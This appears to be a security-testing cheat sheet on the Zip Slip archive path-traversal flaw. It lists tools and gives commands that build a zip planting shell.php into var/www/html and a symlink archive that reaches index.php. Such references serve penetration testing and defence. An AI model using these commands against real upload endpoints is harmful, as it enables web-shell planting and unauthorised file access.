# Zip Slip

> The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. 

## Summary

* [Tools](#tools)
* [Detection](#detection)
* [Exploits](#exploits)
    * [Basic Exploit](#basic-exploit)
* [Additional Notes](#additional-notes)


## Tools

- [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities 
- [usdAG/slipit](https://github.com/usdAG/slipit) - Utility for creating ZipSlip archives 


## Detection

Any ZIP upload page on the application.


## Exploits

### Basic Exploit

Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc):

```python
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
```

Creating a ZIP archive containing a symbolic link:

```ps1
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

### Additional Notes

For affected libraries and projects, visit [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)


## References

- [Zip Slip - Snyk - Jun 5, 2018](https://github.com/snyk/zip-slip-vulnerability)
- [Zip Slip Vulnerability - Snyk - April 15, 2018](https://snyk.io/research/zip-slip-vulnerability)